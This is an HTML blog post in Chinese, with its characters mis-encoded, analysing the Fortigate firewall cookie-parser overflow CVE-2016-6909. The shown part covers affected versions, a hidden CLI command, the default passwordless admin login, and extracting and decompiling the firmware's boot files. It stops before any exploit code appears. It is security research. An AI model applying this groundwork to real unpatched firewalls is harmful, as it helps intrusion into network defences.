

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="å½æˆ‘ç€ğŸ”¥äº†.jpg">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´åˆ†æåŠåˆ©ç”¨">
<meta property="og:url" content="http://example.com/2021/08/10/CVE-0X03-CVE-2016-6909/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="å½æˆ‘ç€ğŸ”¥äº†.jpg">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/08/14/18yn6JfWSH2vaYC.png">
<meta property="article:published_time" content="2021-08-10T07:42:05.000Z">
<meta property="article:modified_time" content="2025-04-20T17:55:14.365Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="ret2text">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="æ ˆæº¢å‡º">
<meta property="article:tag" content="shellcode">
<meta property="article:tag" content="CVE">
<meta property="article:tag" content="ret2shellcode">
<meta property="article:tag" content="Fortigate">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.loli.net/2021/08/14/18yn6JfWSH2vaYC.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´åˆ†æåŠåˆ©ç”¨ - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" target="_blank" rel="noopener" href="https://github.com/arttnba3">
                <i class="iconfont icon-github-fill"></i>
                GitHub
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://i.loli.net/2021/08/14/BWMCH8dNT5jVhbX.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´åˆ†æåŠåˆ©ç”¨"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-08-10 17:42" pubdate>
          2021å¹´8æœˆ10æ—¥ ä¸‹åˆ
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          141 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ã€CVE.0x03ã€‘CVE-2016-6909 Fortigate é˜²ç«å¢™ Cookie è§£ææ¼æ´åˆ†æåŠåˆ©ç”¨</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2025å¹´4æœˆ21æ—¥ å‡Œæ™¨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>å½æˆ‘ç€ğŸ”¥äº†.jpg</p>
<span id="more"></span>

<blockquote>
<p>ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«ç‰¹åˆ«*Nâ€¦.ç®€å•çš„ä¸€ä¸ªæ´ï¼Œæœ¬æ¥åº”è¯¥ä¸€å¤©å°±å¼„å¥½çš„ï¼Œæ„£æ˜¯å› ä¸ºå„ç§ç„å­¦é—®é¢˜åœ¨å…¬å¸æ‹—äº†åŠå‘¨â€¦.</p>
<p>è¿˜æ˜¯å› ä¸ºå¤ªèœäº†ï¼ˆæ¼ï¼‰</p>
</blockquote>
<h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>Fortigate ç³»åˆ—æ˜¯ Fortinetï¼ˆé£å¡”ï¼‰å…¬å¸æ——ä¸‹çš„é˜²ç«å¢™äº§å“ä¹‹ä¸€ï¼Œ2016å¹´ï¼ŒShadow Brokerså…¬å¼€äº†é»‘å®¢ç»„ç»‡<strong>Equation Group</strong>é’ˆå¯¹å„å¤§å‚å•†é˜²ç«å¢™çš„<a target="_blank" rel="noopener" href="https://musalbas.com/blog/2016/08/16/equation-group-firewall-operations-catalogue.html">æ¼æ´åˆ©ç”¨å·¥å…·</a>ï¼Œå­˜åœ¨äº Fortigate ä¸­çš„ä¸€ä¸ªéšè”½çš„æ ˆæº¢å‡ºæ¼æ´ä¹Ÿå°±æ­¤è¢«å¤§ç™½äºå¤©ä¸‹</p>
<p>åœ¨ <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6909">cve.mitre.org</a> ä¸Šå¯¹è¯¥æ¼æ´çš„è¯´æ˜å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>Buffer overflow in the Cookie parser in Fortinet FortiOS 4.x before 4.1.11, 4.2.x before 4.2.13, and 4.3.x before 4.3.9 and FortiSwitch before 3.4.3 allows remote attackers to execute arbitrary code via a crafted HTTP request, aka EGREGIOUSBLUNDER.</p>
</blockquote>
<p>ç¬”è€…ä»Šå¤©å°†å€ŸåŠ©å—å½±å“çš„ä¸€ä¸ªè™šæ‹Ÿæœºç‰ˆæœ¬ <strong>FGT_VM-v400-build0482</strong> æ¥åˆ†æè¯¥æ¼æ´</p>
<h2 id="æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="æ¼æ´å½±å“ç‰ˆæœ¬"></a>æ¼æ´å½±å“ç‰ˆæœ¬</h2><p>Fortinet FortiOS 4.x &lt; 4.1.11, 4.2.x &lt; 4.2.13, 4.3.x &lt; 4.3.9ã€FortiSwitch &lt; 3.4.3</p>
<h2 id="ç™»å…¥-fortigate-VM"><a href="#ç™»å…¥-fortigate-VM" class="headerlink" title="ç™»å…¥ fortigate VM"></a>ç™»å…¥ fortigate VM</h2><p>é»˜è®¤è´¦æˆ·æ˜¯ <code>admin</code> ï¼Œæ— å¯†ç ï¼Œå¯ä»¥ç”¨äºæœ¬åœ°æµ‹è¯•</p>
<p><img src="https://i.loli.net/2021/08/13/7WNytbF5MGnsfVA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é€šå¸¸æƒ…å†µä¸‹é˜²ç«å¢™ä¸ä¼šç»™æˆ‘ä»¬æä¾› shellï¼Œè€Œæ˜¯<strong>ä»…</strong>æä¾›ä¸€ä¸ªç®€æ˜“ CLI ç•Œé¢ï¼Œåœ¨ä¸Šé¢æˆ‘ä»¬åªèƒ½ä½¿ç”¨å…¶æ‰€å†…ç½®æä¾›çš„å‡ ä¸ªåŠŸèƒ½</p>
<h2 id="åé—¨æŒ‡ä»¤"><a href="#åé—¨æŒ‡ä»¤" class="headerlink" title="åé—¨æŒ‡ä»¤"></a>åé—¨æŒ‡ä»¤</h2><p>ä»…é é˜²ç«å¢™çš„åŠŸèƒ½åŸºæœ¬ä¸Šä¸ç®—æ˜¯ä¸€ä¸ªå¯ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œå› æ­¤ fortigate VM CLI æä¾›ç»™æˆ‘ä»¬ä¸€ä¸ªéšè—æŒ‡ä»¤ <code>fnsysctl</code> ä»¥æ‰§è¡Œå…¶é™åˆ¶çš„è¯¸å¦‚ <code>ls</code> ç­‰çš„ä¸€äº›åŸºæœ¬å‘½ä»¤ï¼Œ<strong>ä¸åŒ…æ‹¬ shell</strong></p>
<blockquote>
<p>åç»­é€šè¿‡é€†å‘åˆ†ææˆ‘ä»¬å¯ä»¥å‘ç°å…¶ç¨‹åºæœ¬èº«é™åˆ¶äº†è¿‡æ»¤ shï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•é€šè¿‡ CLI ç›´æ¥æ‹¿åˆ°ä¸€ä¸ª shell</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/4G3kJV8vxMpqTsn.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01.æ¼æ´åˆ†æ"></a>0x01.æ¼æ´åˆ†æ</h1><h2 id="æ–‡ä»¶æå–"><a href="#æ–‡ä»¶æå–" class="headerlink" title="æ–‡ä»¶æå–"></a>æ–‡ä»¶æå–</h2><p>é¦–å…ˆå°†ç¡¬ç›˜é•œåƒ <code>fortios.vmdk</code> æŒ‚è½½åˆ° <code>/mnt</code> ç›®å½•ä¸‹ï¼š</p>
<p><img src="https://i.loli.net/2021/08/11/dsRm83O24UhATKj.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo fdisk -l</span><br>...<br>Device     Boot  Start     End Sectors  Size Id Type<br>/dev/sdb1  *         1  262144  262144  128M 83 Linux<br>/dev/sdb2       262145 4194304 3932160  1.9G 83 Linux<br>...<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> /mnt/fortios</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/fortios</span><br></code></pre></td></tr></table></figure>


<p>ä¹‹åæˆ‘ä»¬ä¾¿èƒ½å¤Ÿåœ¨ <code>/mnt</code> ç›®å½•ä¸‹æŸ¥çœ‹ç£ç›˜ä¸­çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> /mnt/fortios</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 23392<br>drwxr-xr-x 3 root root     1024 Sep 20  2011 ./<br>drwxr-xr-x 5 root root     4096 Aug 10 18:43 ../<br>-rw-r--r-- 1 root root  5182591 Sep 20  2011 datafs.tar.gz<br>-rw-r--r-- 1 root root      107 Sep 20  2011 extlinux.conf<br>lrwxrwxrwx 1 root root       12 Sep 20  2011 flatkc -&gt; ./flatkc.smp<br>-rw-r--r-- 1 root root      256 Sep 20  2011 flatkc.chk<br>-rw-r--r-- 1 root root  1437300 Sep 20  2011 flatkc.nosmp<br>-rw-r--r-- 1 root root  1501003 Sep 20  2011 flatkc.smp<br>-r--r--r-- 1 root root    32256 Sep 20  2011 ldlinux.sys<br>drwx------ 2 root root    12288 Sep 20  2011 lost+found/<br>-rw-r--r-- 1 root root 15678360 Sep 20  2011 rootfs.gz<br>-rw-r--r-- 1 root root      256 Sep 20  2011 rootfs.gz.chk<br></code></pre></td></tr></table></figure>

<blockquote>
<p>ä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼ç›´æ¥æŒ‚è½½é•œåƒæ–‡ä»¶ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe nbd</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/nbd1p1 /mnt</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>æŸ¥çœ‹æ–‡ä»¶ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ä¸¤ä¸ªå†…æ ¸é•œåƒæ–‡ä»¶ <code>flatkc.smp</code> ä¸ <code>flatkc.nosmp</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">file *</span><br>datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size modulo 2^32 8724480<br>extlinux.conf: ASCII text<br>flatkc:        symbolic link to ./flatkc.smp<br>flatkc.chk:    data<br>flatkc.nosmp:  Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGA<br>flatkc.smp:    Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGA<br>ldlinux.sys:   SYSLINUX loader (version 4.00)<br>lost+found:    directory<br>rootfs.gz:     gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size modulo 2^32 19077120<br>rootfs.gz.chk: data<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>extlinux.conf</code> ä¸­æŒ‡å®šäº†ä¸€äº›åŸºæœ¬é…ç½®ï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿ <code>rootfs.gz</code>ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> extlinux.conf</span> <br>DEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz<br></code></pre></td></tr></table></figure>

<p>è§£å‹ <code>rootfs.gz</code> ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar xf ./rootfs.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 28216<br>drwxr-xr-x 10 arttnba3 arttnba3     4096 Sep 20  2011 ./<br>drwxr-xr-x  5 arttnba3 arttnba3     4096 Aug 10 18:52 ../<br>-rw-r--r--  1 arttnba3 arttnba3  8742988 Sep 20  2011 bin.tar.xz<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data/<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data2/<br>drwxr-xr-x  5 arttnba3 arttnba3     4096 Sep 20  2011 dev/<br>lrwxrwxrwx  1 arttnba3 arttnba3        8 Sep 20  2011 etc -&gt; data/etc<br>lrwxrwxrwx  1 arttnba3 arttnba3        1 Sep 20  2011 fortidev -&gt; //<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 lib/<br>-rw-r--r--  1 arttnba3 arttnba3  4424536 Sep 20  2011 migadmin.tar.xz<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 proc/<br>-rw-r--r--  1 arttnba3 arttnba3 15678360 Aug 10 18:54 rootfs.gz<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 sbin/<br>drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 tmp/<br>drwxr-xr-x  8 arttnba3 arttnba3     4096 Sep 20  2011 var/<br></code></pre></td></tr></table></figure>

<h2 id="å¯åŠ¨è¿‡ç¨‹åˆ†æ"><a href="#å¯åŠ¨è¿‡ç¨‹åˆ†æ" class="headerlink" title="å¯åŠ¨è¿‡ç¨‹åˆ†æ"></a>å¯åŠ¨è¿‡ç¨‹åˆ†æ</h2><h3 id="I-init-è¿›ç¨‹"><a href="#I-init-è¿›ç¨‹" class="headerlink" title="I. init è¿›ç¨‹"></a>I. init è¿›ç¨‹</h3><p>Linux å†…æ ¸è½½å…¥åä¼šå¯åŠ¨ç¬¬ä¸€ä¸ªè¿›ç¨‹ <code>init</code>ï¼Œç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶é€šå¸¸æ˜¯ <code>/sbin/init</code>ï¼Œè¯¥æ–‡ä»¶ç³»ç»Ÿä¸­çš„ init æ–‡ä»¶è¾ƒå°ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å…¶æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> *argv[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+0h] [ebp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)sub_8049254(<span class="hljs-string">&quot;bin&quot;</span>) &gt;= <span class="hljs-number">0</span> )<br>    sub_8049254(<span class="hljs-string">&quot;migadmin&quot;</span>);<br>  unlink(<span class="hljs-string">&quot;/sbin/xz&quot;</span>);<br>  unlink(<span class="hljs-string">&quot;/sbin/ftar&quot;</span>);<br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/init&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  execve(<span class="hljs-string">&quot;/bin/init&quot;</span>, argv, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>sub_8049254()</code> æ ¸å¿ƒé€†å‘ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_8049254</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *a1)</span><br>&#123;<br>  <span class="hljs-comment">//...</span><br>  <span class="hljs-built_in">snprintf</span>(s, <span class="hljs-number">0x200</span>u, <span class="hljs-string">&quot;/%s.tar.xz&quot;</span>, a1);<br>  <span class="hljs-comment">//...</span><br>  v1 = fork();<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      waitpid(v1, &amp;stat_loc, <span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( BYTE1(stat_loc) )<br>        <span class="hljs-keyword">goto</span> LABEL_21;<br>      unlink(s);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/sbin/xz&quot;</span>;<br>    argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;--check=sha256&quot;</span>;<br>    argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;-d&quot;</span>;<br>    argv[<span class="hljs-number">3</span>] = s;<br>    argv[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>    execv(<span class="hljs-string">&quot;/sbin/xz&quot;</span>, argv);<br>  &#125;<br>  <span class="hljs-built_in">snprintf</span>(name, <span class="hljs-number">0x200</span>u, <span class="hljs-string">&quot;/%s.tar&quot;</span>, a1);<br>  v3 = fork();<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    <span class="hljs-comment">//..</span><br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    waitpid(v3, &amp;v10, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( !BYTE1(v10) )<br>    &#123;<br>      unlink(name);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>LABEL_21:<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;decompress init failed&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  v12[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/sbin/ftar&quot;</span>;<br>  v12[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-xf&quot;</span>;<br>  v12[<span class="hljs-number">2</span>] = name;<br>  v12[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>  execv(<span class="hljs-string">&quot;/sbin/ftar&quot;</span>, v12);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ•… init è¿›ç¨‹åˆ†æå¦‚ä¸‹ï¼š</p>
<ul>
